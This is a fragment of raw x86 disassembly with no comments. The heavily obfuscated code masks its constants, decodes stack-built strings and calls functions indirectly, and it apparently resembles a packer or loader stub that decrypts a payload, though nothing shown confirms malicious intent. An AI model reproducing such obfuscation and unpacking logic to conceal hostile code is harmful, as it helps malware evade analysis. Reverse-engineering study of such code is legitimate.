  41299c:	push   DWORD PTR [eax+0x8c]
  4129a2:	push   edx
  4129a3:	call   DWORD PTR [ecx+0x1c]
  4129a6:	push   DWORD PTR [ebp+0x8]
  4129a9:	mov    edi,DWORD PTR [ebp+0x8]
  4129ac:	mov    eax,DWORD PTR [ebp+0x8]
  4129af:	mov    edx,DWORD PTR [eax+0x1b8]
  4129b5:	mov    DWORD PTR [ebp-0x5c],0xc0e0f06
  4129bc:	mov    DWORD PTR [ebp-0x58],0x50a091f
  4129c3:	mov    WORD PTR [ebp-0x54],0x7a3d
  4129c9:	mov    DWORD PTR [ebp-0x70],0x23f0f25
  4129d0:	mov    DWORD PTR [ebp-0x6c],0x63d0c1d
  4129d7:	mov    DWORD PTR [ebp-0x68],0x281d020a
  4129de:	mov    DWORD PTR [ebp-0x64],0xc0109f1
  4129e5:	mov    DWORD PTR [ebp-0x60],0x7a3d1f05
  4129ec:	mov    DWORD PTR [ebp-0x84],0x23f0f25
  4129f6:	mov    DWORD PTR [ebp-0x80],0x63d0c1d
  4129fd:	mov    DWORD PTR [ebp-0x7c],0x281d020a
  412a04:	mov    DWORD PTR [ebp-0x78],0xc0109f1
  412a0b:	mov    DWORD PTR [ebp-0x74],0x7a131f05
  412a12:	call   0x414b33
  412a17:	push   eax
  412a18:	mov    eax,DWORD PTR [ebp+0x8]
  412a1b:	mov    eax,DWORD PTR [eax+0x1a8]
  412a21:	push   DWORD PTR [eax]
  412a23:	call   0x4147d5
  412a28:	test   eax,eax
  412a2a:	jne    0x412a7c
  412a2c:	mov    eax,DWORD PTR [ebp+0x8]
  412a2f:	mov    eax,DWORD PTR [eax+0x1d8]
  412a35:	mov    edi,DWORD PTR [ebp+0x8]
  412a38:	add    eax,0x4
  412a3b:	mov    DWORD PTR [ebp-0x18],eax
  412a3e:	mov    eax,DWORD PTR [ebp+0x8]
  412a41:	mov    edx,DWORD PTR [eax+0x1b8]
  412a47:	call   0x414b33
  412a4c:	push   eax
  412a4d:	mov    eax,DWORD PTR [ebp-0x18]
  412a50:	call   DWORD PTR [eax]
  412a52:	test   eax,eax
  412a54:	jne    0x412a7c
  412a56:	mov    eax,DWORD PTR [ebp+0x8]
  412a59:	mov    eax,DWORD PTR [eax+0x1d8]
  412a5f:	mov    edi,DWORD PTR [ebp+0x8]
  412a62:	add    eax,0x10
  412a65:	mov    DWORD PTR [ebp-0x18],eax
  412a68:	mov    eax,DWORD PTR [ebp+0x8]
  412a6b:	mov    edx,DWORD PTR [eax+0x1b8]
  412a71:	call   0x414b33
  412a76:	push   eax
  412a77:	mov    eax,DWORD PTR [ebp-0x18]
  412a7a:	call   DWORD PTR [eax]
  412a7c:	mov    eax,DWORD PTR [ebp-0x8]
  412a7f:	mov    ecx,DWORD PTR [ebp-0x1c]
  412a82:	xor    eax,ebx
  412a84:	add    eax,esi
  412a86:	cmp    eax,ecx
  412a88:	je     0x412c07
  412a8e:	mov    eax,DWORD PTR [ebp-0x34]
  412a91:	xor    eax,ebx
  412a93:	mov    ecx,0xffcd8d23
  412a98:	sub    ecx,eax
  412a9a:	add    ecx,DWORD PTR [ebp-0x1c]
  412a9d:	mov    eax,DWORD PTR [ebp-0x14]
  412aa0:	cmp    eax,ecx
  412aa2:	ja     0x412c07
  412aa8:	mov    DWORD PTR [ebp-0x4],0x0
  412aaf:	push   DWORD PTR [ebp+0x8]
  412ab2:	mov    edi,DWORD PTR [ebp+0x8]
  412ab5:	mov    eax,DWORD PTR [ebp+0x8]
  412ab8:	mov    edx,DWORD PTR [eax+0x1b4]
  412abe:	call   0x414b33
  412ac3:	push   eax
  412ac4:	mov    eax,DWORD PTR [ebp+0x8]
  412ac7:	mov    eax,DWORD PTR [eax+0x1a8]
  412acd:	push   DWORD PTR [eax]
  412acf:	call   0x4147d5
  412ad4:	mov    ecx,DWORD PTR [ebp+0x8]
  412ad7:	mov    ecx,DWORD PTR [ecx+0x19c]
  412add:	mov    DWORD PTR [ecx],eax
  412adf:	mov    eax,DWORD PTR [ebp+0x8]
  412ae2:	mov    edi,DWORD PTR [eax+0x1d8]
  412ae8:	mov    esi,DWORD PTR [ebp+0x8]
  412aeb:	xor    eax,eax
  412aed:	lea    edx,[ebp-0x84]
  412af3:	call   0x414b69
  412af8:	push   eax
  412af9:	mov    eax,DWORD PTR [ebp+0x8]
  412afc:	mov    eax,DWORD PTR [eax+0x19c]
  412b02:	push   DWORD PTR [eax]
  412b04:	call   DWORD PTR [edi+0x8]
  412b07:	mov    DWORD PTR [ebp-0x18],eax
  412b0a:	mov    eax,DWORD PTR [ebp+0x8]
  412b0d:	mov    edi,DWORD PTR [eax+0x1d8]
  412b13:	mov    esi,DWORD PTR [ebp+0x8]
  412b16:	xor    eax,eax
  412b18:	lea    edx,[ebp-0x70]
  412b1b:	call   0x414b69
  412b20:	push   eax
  412b21:	mov    eax,DWORD PTR [ebp+0x8]
  412b24:	mov    eax,DWORD PTR [eax+0x19c]
  412b2a:	push   DWORD PTR [eax]
  412b2c:	call   DWORD PTR [edi+0x8]
  412b2f:	and    DWORD PTR [ebp-0x10],0x0
  412b33:	mov    eax,DWORD PTR [ebp-0x10]
  412b36:	and    eax,0x7
  412b39:	add    eax,0x31
  412b3c:	push   eax
  412b3d:	call   DWORD PTR [ebp-0x18]
  412b40:	test   eax,eax
  412b42:	jne    0x412b49
  412b44:	and    DWORD PTR [ebp-0xc],eax
  412b47:	jmp    0x412b71
  412b49:	mov    eax,DWORD PTR [ebp+0x8]
  412b4c:	mov    edi,DWORD PTR [eax+0x1d8]
  412b52:	mov    esi,DWORD PTR [ebp+0x8]
  412b55:	xor    eax,eax
  412b57:	lea    edx,[ebp-0x5c]
  412b5a:	call   0x414b69
  412b5f:	push   eax
  412b60:	mov    eax,DWORD PTR [ebp+0x8]
  412b63:	mov    eax,DWORD PTR [eax+0x198]
  412b69:	push   DWORD PTR [eax]
  412b6b:	call   DWORD PTR [edi+0x8]
  412b6e:	mov    DWORD PTR [ebp-0xc],eax
  412b71:	inc    DWORD PTR [ebp-0x10]
  412b74:	cmp    DWORD PTR [ebp-0x10],0x10
  412b78:	jb     0x412b33
  412b7a:	mov    eax,DWORD PTR [ebp-0x34]
  412b7d:	mov    esi,DWORD PTR [ebp+0x8]
  412b80:	xor    eax,ebx
  412b82:	mov    edi,0x3272dd
  412b87:	add    eax,edi
  412b89:	lea    edx,[ebp-0xcc]
  412b8f:	call   0x414b69
  412b94:	push   eax
  412b95:	mov    eax,DWORD PTR [ebp-0x8]
  412b98:	mov    esi,DWORD PTR [ebp+0x8]
  412b9b:	xor    eax,ebx
  412b9d:	add    eax,edi
  412b9f:	lea    edx,[ebp-0xec]
  412ba5:	call   0x414b69
  412baa:	push   eax
  412bab:	call   DWORD PTR [ebp-0xc]
  412bae:	mov    ecx,DWORD PTR [ebp-0x8]
  412bb1:	xor    ecx,ebx
  412bb3:	add    ecx,edi
  412bb5:	cmp    ecx,eax
  412bb7:	jne    0x412bc0
  412bb9:	mov    DWORD PTR [ebp-0x4],0x1
  412bc0:	mov    eax,DWORD PTR [ebp-0x34]
  412bc3:	mov    ecx,DWORD PTR [ebp-0x14]
  412bc6:	xor    eax,ebx
  412bc8:	lea    eax,[eax+ecx*1+0x3272dd]
  412bcf:	mov    DWORD PTR [ebp-0x14],eax
  412bd2:	mov    eax,DWORD PTR [ebp-0x4]
  412bd5:	test   eax,eax
  412bd7:	je     0x412beb
  412bd9:	mov    eax,DWORD PTR [ebp-0x34]
  412bdc:	mov    ecx,DWORD PTR [ebp-0x24]
  412bdf:	xor    eax,ebx
  412be1:	lea    eax,[eax+ecx*1+0x3272dd]
  412be8:	mov    DWORD PTR [ebp-0x24],eax
  412beb:	mov    eax,DWORD PTR [ebp-0x34]
  412bee:	xor    eax,ebx
  412bf0:	mov    ecx,0xffcd8d23
  412bf5:	sub    ecx,eax
  412bf7:	add    ecx,DWORD PTR [ebp-0x1c]
  412bfa:	mov    eax,DWORD PTR [ebp-0x14]
  412bfd:	cmp    eax,ecx
  412bff:	jbe    0x412aa8
  412c05:	mov    esi,edi
  412c07:	mov    eax,DWORD PTR [ebp-0x24]
  412c0a:	mov    ecx,DWORD PTR [ebp-0x14]
  412c0d:	cmp    ecx,eax
  412c0f:	jne    0x412c22
  412c11:	push   DWORD PTR [ebp+0x8]
  412c14:	lea    eax,[ebp-0x30]
  412c17:	push   eax
  412c18:	call   0x4155e2
  412c1d:	mov    DWORD PTR [ebp-0x20],eax
  412c20:	jmp    0x412c2e
  412c22:	mov    eax,DWORD PTR [ebp-0x20]
  412c25:	mov    ecx,DWORD PTR [ebp-0x34]
  412c28:	xor    ecx,ebx
  412c2a:	add    ecx,esi
  412c2c:	xor    DWORD PTR [eax],ecx
  412c2e:	mov    eax,DWORD PTR [ebp-0x8]
  412c31:	mov    ecx,DWORD PTR [ebp-0x20]
  412c34:	xor    eax,ebx
  412c36:	add    eax,esi
  412c38:	cmp    eax,ecx
  412c3a:	je     0x413224
  412c40:	mov    eax,DWORD PTR [ebp-0x8]
  412c43:	mov    ecx,DWORD PTR [ebp-0x30]
  412c46:	xor    eax,ebx
  412c48:	add    eax,esi
  412c4a:	cmp    eax,ecx
  412c4c:	je     0x413224
  412c52:	mov    eax,DWORD PTR [ebp-0x8]
  412c55:	xor    eax,ebx
  412c57:	add    eax,esi
  412c59:	jmp    0x412c77
  412c5b:	mov    edi,DWORD PTR [ebp-0x20]
  412c5e:	mov    cl,al
  412c60:	and    cl,0x1f
  412c63:	or     dl,0xff
  412c66:	sub    dl,cl
  412c68:	add    BYTE PTR [edi+eax*1],dl
  412c6b:	mov    ecx,DWORD PTR [ebp-0x34]
  412c6e:	xor    ecx,ebx
  412c70:	lea    eax,[eax+ecx*1+0x3272dd]
  412c77:	mov    ecx,DWORD PTR [ebp-0x30]
  412c7a:	cmp    eax,ecx
  412c7c:	jb     0x412c5b
  412c7e:	mov    eax,DWORD PTR [ebp-0x30]
  412c81:	mov    DWORD PTR [ebp-0x1c],eax
  412c84:	mov    eax,DWORD PTR [ebp-0x20]
  412c87:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  412c8e:	mov    DWORD PTR [ebp-0xa8],eax
  412c94:	mov    ecx,0xf89c85b2
  412c99:	mov    DWORD PTR [ebp-0x14],ecx
  412c9c:	mov    eax,DWORD PTR [ebp-0x24]
  412c9f:	xor    eax,ebx
  412ca1:	add    eax,esi
  412ca3:	mov    DWORD PTR [ebp-0x4],eax
  412ca6:	mov    eax,DWORD PTR [ebp-0x24]
  412ca9:	xor    eax,ebx
  412cab:	add    eax,esi
  412cad:	mov    DWORD PTR [ebp-0x10],eax
  412cb0:	mov    DWORD PTR [ebp-0x40],0xf89c85d5
  412cb7:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  412cbe:	mov    eax,DWORD PTR [ebp-0x24]
  412cc1:	mov    edx,DWORD PTR [ebp-0x1c]
  412cc4:	xor    eax,ebx
  412cc6:	add    eax,esi
  412cc8:	cmp    edx,eax
  412cca:	je     0x412e02
  412cd0:	jmp    0x412dde
  412cd5:	mov    edx,DWORD PTR [ebp-0x4]
  412cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  412cdb:	mov    edi,DWORD PTR [ebp-0x40]
  412cde:	sub    eax,edx
  412ce0:	xor    edi,ebx
  412ce2:	xor    edx,edx
  412ce4:	add    edi,esi
  412ce6:	div    edi
  412ce8:	mov    DWORD PTR [ebp-0x10],eax
  412ceb:	mov    eax,DWORD PTR [ebp-0x44]
  412cee:	mov    edx,DWORD PTR [ebp-0x10]
  412cf1:	xor    eax,ebx
  412cf3:	add    eax,esi
  412cf5:	cmp    edx,eax
  412cf7:	jbe    0x412d03
  412cf9:	mov    eax,DWORD PTR [ebp-0x44]
  412cfc:	xor    eax,ebx
  412cfe:	add    eax,esi
  412d00:	mov    DWORD PTR [ebp-0x10],eax
  412d03:	mov    eax,DWORD PTR [ebp-0x40]
  412d06:	mov    edx,DWORD PTR [ebp-0x10]
  412d09:	xor    eax,ebx
  412d0b:	add    eax,esi
  412d0d:	imul   eax,edx
  412d10:	mov    DWORD PTR [ebp-0x10],eax
  412d13:	mov    eax,DWORD PTR [ebp-0x24]
  412d16:	mov    edx,DWORD PTR [ebp-0x10]
  412d19:	xor    eax,ebx
  412d1b:	add    eax,esi
  412d1d:	cmp    edx,eax
  412d1f:	je     0x412dcc
  412d25:	mov    eax,DWORD PTR [ebp-0x10]
  412d28:	mov    DWORD PTR [ebp-0xc],eax
  412d2b:	mov    eax,DWORD PTR [ebp-0x4]
  412d2e:	add    eax,DWORD PTR [ebp-0xa8]
  412d34:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  412d3b:	mov    DWORD PTR [ebp-0x38],ecx
  412d3e:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  412d45:	mov    DWORD PTR [ebp-0x88],eax
  412d4b:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  412d52:	mov    DWORD PTR [ebp-0x94],ecx
  412d58:	mov    eax,DWORD PTR [ebp-0x18]
  412d5b:	xor    eax,ebx
  412d5d:	add    eax,esi
  412d5f:	jmp    0x412d8f
  412d61:	mov    eax,DWORD PTR [ebp-0x94]
  412d67:	mov    edx,DWORD PTR [ebp-0x10]
  412d6a:	xor    eax,ebx
  412d6c:	add    eax,esi
  412d6e:	imul   eax,edx
  412d71:	mov    edx,DWORD PTR [ebp-0x88]
  412d77:	mov    BYTE PTR [eax+edx*1],0x0
  412d7b:	mov    eax,DWORD PTR [ebp-0x28]
  412d7e:	mov    edx,DWORD PTR [ebp-0x38]
  412d81:	xor    eax,ebx
  412d83:	xor    edx,ebx
  412d85:	add    eax,esi
  412d87:	add    edx,esi
  412d89:	imul   eax,edx
  412d8c:	add    eax,DWORD PTR [ebp-0x10]
  412d8f:	mov    DWORD PTR [ebp-0x10],eax
  412d92:	mov    eax,DWORD PTR [ebp-0x10]
  412d95:	mov    edx,DWORD PTR [ebp-0xc]
  412d98:	cmp    edx,eax
  412d9a:	jb     0x412d61
  412d9c:	mov    eax,DWORD PTR [ebp-0x38]
  412d9f:	mov    edx,DWORD PTR [ebp-0xc]
  412da2:	xor    eax,ebx
  412da4:	add    eax,esi
  412da6:	imul   eax,edx
  412da9:	mov    edx,DWORD PTR [ebp-0x18]
  412dac:	xor    edx,ebx
  412dae:	add    edx,esi
  412db0:	or     eax,edx
  412db2:	mov    edx,DWORD PTR [ebp-0x14]
  412db5:	xor    edx,ebx
  412db7:	add    eax,edx
  412db9:	mov    edx,DWORD PTR [ebp-0x14]
  412dbc:	xor    edx,ebx
  412dbe:	add    eax,edx
  412dc0:	mov    edx,DWORD PTR [ebp-0x4]
  412dc3:	lea    eax,[eax+edx*1+0x64e5ba]
  412dca:	jmp    0x412ddb
  412dcc:	mov    eax,DWORD PTR [ebp-0x14]
  412dcf:	mov    edx,DWORD PTR [ebp-0x4]
  412dd2:	xor    eax,ebx
  412dd4:	lea    eax,[eax+edx*1+0x3272dd]
  412ddb:	mov    DWORD PTR [ebp-0x4],eax
  412dde:	mov    eax,DWORD PTR [ebp-0x14]
  412de1:	xor    eax,ebx
  412de3:	mov    edx,0xffcd8d23
  412de8:	sub    edx,eax
  412dea:	add    edx,DWORD PTR [ebp-0x1c]
  412ded:	mov    eax,DWORD PTR [ebp-0x14]
  412df0:	mov    edi,DWORD PTR [ebp-0x4]
  412df3:	xor    eax,ebx
  412df5:	add    eax,esi
  412df7:	imul   eax,edi
  412dfa:	cmp    eax,edx
  412dfc:	jbe    0x412cd5
  412e02:	mov    eax,DWORD PTR [ebp-0x8]
  412e05:	mov    ecx,DWORD PTR [ebp-0x30]
  412e08:	mov    eax,DWORD PTR [ebp+0x8]
  412e0b:	mov    edx,DWORD PTR [ebp-0x3c]
  412e0e:	mov    eax,DWORD PTR [eax+0x1d8]
  412e14:	xor    edx,ebx
  412e16:	add    edx,esi
  412e18:	push   edx
  412e19:	mov    edx,DWORD PTR [ebp-0x2c]
  412e1c:	xor    edx,ebx
  412e1e:	add    edx,esi
  412e20:	push   edx
  412e21:	push   ecx
  412e22:	mov    DWORD PTR [ebp-0x28],ecx
  412e25:	mov    ecx,DWORD PTR [ebp-0x8]
  412e28:	xor    ecx,ebx
  412e2a:	add    ecx,esi
  412e2c:	push   ecx
  412e2d:	call   DWORD PTR [eax+0x14]
  412e30:	mov    edi,eax
  412e32:	mov    eax,DWORD PTR [ebp-0x8]
  412e35:	xor    eax,ebx
  412e37:	add    eax,esi
  412e39:	cmp    eax,edi
  412e3b:	je     0x412e96
  412e3d:	mov    eax,DWORD PTR [ebp-0x8]
  412e40:	jmp    0x412e63
  412e42:	mov    ecx,DWORD PTR [ebp-0x20]
  412e45:	xor    eax,ebx
  412e47:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  412e4e:	mov    BYTE PTR [eax+edi*1+0x3272dd],cl
  412e55:	mov    ecx,DWORD PTR [ebp-0x34]
  412e58:	xor    ecx,ebx
  412e5a:	lea    eax,[ecx+eax*1+0x3272dd]
  412e61:	xor    eax,ebx
  412e63:	mov    ecx,DWORD PTR [ebp-0x30]
  412e66:	sub    ecx,esi
  412e68:	xor    ecx,ebx
  412e6a:	cmp    eax,ecx
  412e6c:	jne    0x412e42
  412e6e:	mov    eax,DWORD PTR [ebp+0x8]
  412e71:	mov    ecx,DWORD PTR [ebp-0x48]
  412e74:	mov    eax,DWORD PTR [eax+0x1d8]
  412e7a:	xor    ecx,ebx
  412e7c:	add    ecx,esi
  412e7e:	push   ecx
  412e7f:	mov    ecx,DWORD PTR [ebp-0x8]
  412e82:	xor    ecx,ebx
  412e84:	add    ecx,esi
  412e86:	push   ecx
  412e87:	push   DWORD PTR [ebp-0x20]
  412e8a:	call   DWORD PTR [eax+0x18]
  412e8d:	mov    eax,DWORD PTR [ebp-0x28]
  412e90:	mov    DWORD PTR [ebp-0x20],edi
  412e93:	mov    DWORD PTR [ebp-0x30],eax
  412e96:	mov    edi,DWORD PTR [ebp-0x20]
  412e99:	mov    eax,DWORD PTR [ebp-0x34]
  412e9c:	mov    ecx,DWORD PTR [ebp-0x8]
  412e9f:	xor    eax,ebx
  412ea1:	mov    DWORD PTR [ebp-0x28],edi
  412ea4:	add    eax,esi
  412ea6:	mov    DWORD PTR [ebp-0x50],0x3d122a12
  412ead:	mov    DWORD PTR [ebp-0x4c],0x27123f12
  412eb4:	jmp    0x412ee8
  412eb6:	xor    ecx,ebx
  412eb8:	mov    dl,BYTE PTR [ebp+ecx*1+0x32728d]
  412ebf:	xor    dl,0x71
  412ec2:	sub    dl,0xb
  412ec5:	mov    DWORD PTR [ebp-0x2c],ecx
  412ec8:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272dd]
  412ed0:	movzx  edx,dl
  412ed3:	cmp    ecx,edx
  412ed5:	jne    0x412ef2
  412ed7:	mov    ecx,DWORD PTR [ebp-0x34]
  412eda:	mov    edx,DWORD PTR [ebp-0x2c]
  412edd:	xor    ecx,ebx
  412edf:	lea    ecx,[ecx+edx*1+0x3272dd]
  412ee6:	xor    ecx,ebx
  412ee8:	cmp    ecx,0xf89c85bd
  412eee:	jne    0x412eb6
  412ef0:	jmp    0x412ef9
  412ef2:	mov    eax,DWORD PTR [ebp-0x8]
  412ef5:	xor    eax,ebx
  412ef7:	add    eax,esi
  412ef9:	mov    ecx,DWORD PTR [ebp-0x8]
  412efc:	xor    ecx,ebx
  412efe:	add    ecx,esi
  412f00:	cmp    ecx,eax
  412f02:	je     0x413075
  412f08:	mov    eax,DWORD PTR [edi+0x8]
  412f0b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  412f12:	mov    DWORD PTR [ebp-0x2c],0xf89cc304
  412f19:	mov    DWORD PTR [ebp-0x38],0xf89cb5b5
  412f20:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  412f27:	mov    DWORD PTR [ebp-0xc],eax
  412f2a:	mov    eax,DWORD PTR [ebp+0x8]
  412f2d:	mov    ecx,DWORD PTR [ebp-0x18]
  412f30:	xor    ecx,ebx
  412f32:	add    ecx,esi
  412f34:	push   ecx
  412f35:	mov    ecx,DWORD PTR [ebp-0x38]
  412f38:	mov    eax,DWORD PTR [eax+0x1d8]
  412f3e:	xor    ecx,ebx
  412f40:	add    ecx,esi
  412f42:	push   ecx
  412f43:	mov    ecx,DWORD PTR [ebp-0x2c]
  412f46:	xor    ecx,ebx
  412f48:	add    ecx,esi
  412f4a:	push   ecx
  412f4b:	mov    ecx,DWORD PTR [ebp-0x4]
  412f4e:	xor    ecx,ebx
  412f50:	add    ecx,esi
  412f52:	push   ecx
  412f53:	call   DWORD PTR [eax+0x14]
  412f56:	mov    edi,eax
  412f58:	mov    eax,DWORD PTR [ebp+0x8]
  412f5b:	mov    ecx,DWORD PTR [ebp-0x18]
  412f5e:	mov    eax,DWORD PTR [eax+0x1d8]
  412f64:	xor    ecx,ebx
  412f66:	add    ecx,esi
  412f68:	push   ecx
  412f69:	mov    ecx,DWORD PTR [ebp-0x38]
  412f6c:	xor    ecx,ebx
  412f6e:	add    ecx,esi
  412f70:	push   ecx
  412f71:	mov    ecx,DWORD PTR [ebp-0x4]
  412f74:	push   DWORD PTR [ebp-0xc]
  412f77:	xor    ecx,ebx
  412f79:	add    ecx,esi
  412f7b:	push   ecx
  412f7c:	call   DWORD PTR [eax+0x14]
  412f7f:	mov    ecx,DWORD PTR [ebp-0x4]
  412f82:	xor    ecx,ebx
  412f84:	add    ecx,esi
  412f86:	mov    DWORD PTR [ebp-0x18],eax
  412f89:	cmp    ecx,edi
  412f8b:	je     0x413251
  412f91:	mov    ecx,DWORD PTR [ebp-0x4]
  412f94:	xor    ecx,ebx
  412f96:	add    ecx,esi
  412f98:	cmp    ecx,eax
  412f9a:	je     0x413251
  412fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  412fa7:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  412fae:	mov    ecx,DWORD PTR [ebp-0x2c]
  412fb1:	xor    cl,0x96
  412fb4:	sub    cl,0x23
  412fb7:	mov    BYTE PTR [edi],cl
  412fb9:	mov    ecx,DWORD PTR [ebp-0x4]
  412fbc:	xor    cl,0x96
  412fbf:	sub    cl,0x23
  412fc2:	mov    BYTE PTR [edi+0x1],cl
  412fc5:	mov    ecx,DWORD PTR [ebp-0x3c]
  412fc8:	xor    cl,0x96
  412fcb:	sub    cl,0x23
  412fce:	mov    BYTE PTR [edi+0x2],cl
  412fd1:	and    DWORD PTR [ebp-0x98],0x0
  412fd8:	and    DWORD PTR [ebp-0xa4],0x0
  412fdf:	lea    ecx,[ebp-0xa4]
  412fe5:	push   ecx
  412fe6:	push   DWORD PTR [ebp-0xc]
  412fe9:	push   eax
  412fea:	lea    eax,[ebp-0x98]
  412ff0:	push   eax
  412ff1:	mov    eax,DWORD PTR [ebp-0x28]
  412ff4:	push   DWORD PTR [eax+0xc]
  412ff7:	mov    eax,DWORD PTR [ebp-0x20]
  412ffa:	add    eax,0x10
  412ffd:	push   eax
  412ffe:	push   edi
  412fff:	call   0x41241b
  413004:	mov    DWORD PTR [ebp-0x2c],eax
  413007:	mov    eax,DWORD PTR [ebp+0x8]
  41300a:	mov    ecx,DWORD PTR [ebp-0x48]
  41300d:	mov    eax,DWORD PTR [eax+0x1d8]
  413013:	xor    ecx,ebx
  413015:	add    ecx,esi
  413017:	push   ecx
  413018:	mov    ecx,DWORD PTR [ebp-0x4]
  41301b:	xor    ecx,ebx
  41301d:	add    ecx,esi
  41301f:	push   ecx
  413020:	push   edi
  413021:	call   DWORD PTR [eax+0x18]
  413024:	mov    eax,DWORD PTR [ebp-0x2c]
  413027:	add    eax,0xffcd8d23
  41302c:	xor    eax,ebx
  41302e:	cmp    eax,0xf89c85b5
  413033:	mov    eax,DWORD PTR [ebp+0x8]
  413036:	mov    eax,DWORD PTR [eax+0x1d8]
  41303c:	mov    ecx,DWORD PTR [ebp-0x48]
  41303f:	jne    0x413062
  413041:	xor    ecx,ebx
  413043:	add    ecx,esi
  413045:	push   ecx
  413046:	mov    ecx,DWORD PTR [ebp-0x4]
  413049:	xor    ecx,ebx
  41304b:	add    ecx,esi
  41304d:	push   ecx
  41304e:	push   DWORD PTR [ebp-0x20]
  413051:	call   DWORD PTR [eax+0x18]
  413054:	mov    eax,DWORD PTR [ebp-0x18]
  413057:	mov    DWORD PTR [ebp-0x20],eax
  41305a:	mov    eax,DWORD PTR [ebp-0xc]
  41305d:	mov    DWORD PTR [ebp-0x30],eax
  413060:	jmp    0x413075
  413062:	xor    ecx,ebx
  413064:	add    ecx,esi
  413066:	push   ecx
  413067:	mov    ecx,DWORD PTR [ebp-0x4]
  41306a:	xor    ecx,ebx
  41306c:	add    ecx,esi
  41306e:	push   ecx
  41306f:	push   DWORD PTR [ebp-0x18]
  413072:	call   DWORD PTR [eax+0x18]
  413075:	mov    eax,DWORD PTR [ebp-0x30]
  413078:	mov    DWORD PTR [ebp-0x24],eax
  41307b:	mov    eax,DWORD PTR [ebp-0x20]
  41307e:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  413085:	mov    DWORD PTR [ebp-0x2c],eax
  413088:	mov    ecx,0xf89c85b2
  41308d:	mov    DWORD PTR [ebp-0x14],ecx
  413090:	mov    eax,DWORD PTR [ebp-0x1c]
  413093:	xor    eax,ebx
  413095:	add    eax,esi
  413097:	mov    DWORD PTR [ebp-0x4],eax
  41309a:	mov    eax,DWORD PTR [ebp-0x1c]
  41309d:	xor    eax,ebx
  41309f:	add    eax,esi
  4130a1:	mov    DWORD PTR [ebp-0xc],eax
  4130a4:	mov    DWORD PTR [ebp-0x38],0xf89c85d5
  4130ab:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  4130b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4130b5:	mov    edx,DWORD PTR [ebp-0x24]
  4130b8:	xor    eax,ebx
  4130ba:	add    eax,esi
  4130bc:	cmp    edx,eax
  4130be:	je     0x4131ed
  4130c4:	jmp    0x4131c9
  4130c9:	mov    edx,DWORD PTR [ebp-0x4]
  4130cc:	mov    eax,DWORD PTR [ebp-0x24]
  4130cf:	mov    edi,DWORD PTR [ebp-0x38]
  4130d2:	sub    eax,edx
  4130d4:	xor    edi,ebx
  4130d6:	xor    edx,edx
  4130d8:	add    edi,esi
  4130da:	div    edi
  4130dc:	mov    DWORD PTR [ebp-0xc],eax
  4130df:	mov    eax,DWORD PTR [ebp-0x18]
  4130e2:	mov    edx,DWORD PTR [ebp-0xc]
  4130e5:	xor    eax,ebx
  4130e7:	add    eax,esi
  4130e9:	cmp    edx,eax
  4130eb:	jbe    0x4130f7
  4130ed:	mov    eax,DWORD PTR [ebp-0x18]
  4130f0:	xor    eax,ebx
  4130f2:	add    eax,esi
  4130f4:	mov    DWORD PTR [ebp-0xc],eax
  4130f7:	mov    eax,DWORD PTR [ebp-0x38]
  4130fa:	mov    edx,DWORD PTR [ebp-0xc]
  4130fd:	xor    eax,ebx
  4130ff:	add    eax,esi
  413101:	imul   eax,edx
  413104:	mov    DWORD PTR [ebp-0xc],eax
  413107:	mov    eax,DWORD PTR [ebp-0x1c]
  41310a:	mov    edx,DWORD PTR [ebp-0xc]
  41310d:	xor    eax,ebx
  41310f:	add    eax,esi
  413111:	cmp    edx,eax
  413113:	je     0x4131b7
  413119:	mov    eax,DWORD PTR [ebp-0xc]
  41311c:	mov    DWORD PTR [ebp-0xc],eax
  41311f:	mov    eax,DWORD PTR [ebp-0x4]
  413122:	add    eax,DWORD PTR [ebp-0x2c]
  413125:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  41312c:	mov    DWORD PTR [ebp-0x40],ecx
  41312f:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  413136:	mov    DWORD PTR [ebp-0x28],eax
  413139:	mov    DWORD PTR [ebp-0x88],0xf89c85b0
  413143:	mov    DWORD PTR [ebp-0x3c],ecx
  413146:	mov    eax,DWORD PTR [ebp-0x44]
  413149:	xor    eax,ebx
  41314b:	add    eax,esi
  41314d:	jmp    0x41317a
  41314f:	mov    eax,DWORD PTR [ebp-0x3c]
  413152:	mov    edx,DWORD PTR [ebp-0x10]
  413155:	xor    eax,ebx
  413157:	add    eax,esi
  413159:	imul   eax,edx
  41315c:	mov    edx,DWORD PTR [ebp-0x28]
  41315f:	mov    BYTE PTR [eax+edx*1],0x0
  413163:	mov    eax,DWORD PTR [ebp-0x88]
  413169:	mov    edx,DWORD PTR [ebp-0x40]
  41316c:	xor    eax,ebx
  41316e:	xor    edx,ebx
  413170:	add    eax,esi
  413172:	add    edx,esi
  413174:	imul   eax,edx
  413177:	add    eax,DWORD PTR [ebp-0x10]
  41317a:	mov    DWORD PTR [ebp-0x10],eax
  41317d:	mov    eax,DWORD PTR [ebp-0x10]
  413180:	mov    edx,DWORD PTR [ebp-0xc]
  413183:	cmp    edx,eax
  413185:	jb     0x41314f
  413187:	mov    eax,DWORD PTR [ebp-0x40]
  41318a:	mov    edx,DWORD PTR [ebp-0xc]
  41318d:	xor    eax,ebx
  41318f:	add    eax,esi
  413191:	imul   eax,edx
  413194:	mov    edx,DWORD PTR [ebp-0x44]
  413197:	xor    edx,ebx
  413199:	add    edx,esi
  41319b:	or     eax,edx
  41319d:	mov    edx,DWORD PTR [ebp-0x14]
  4131a0:	xor    edx,ebx
  4131a2:	add    eax,edx
  4131a4:	mov    edx,DWORD PTR [ebp-0x14]
  4131a7:	xor    edx,ebx
  4131a9:	add    eax,edx
  4131ab:	mov    edx,DWORD PTR [ebp-0x4]
  4131ae:	lea    eax,[eax+edx*1+0x64e5ba]
  4131b5:	jmp    0x4131c6
  4131b7:	mov    eax,DWORD PTR [ebp-0x14]
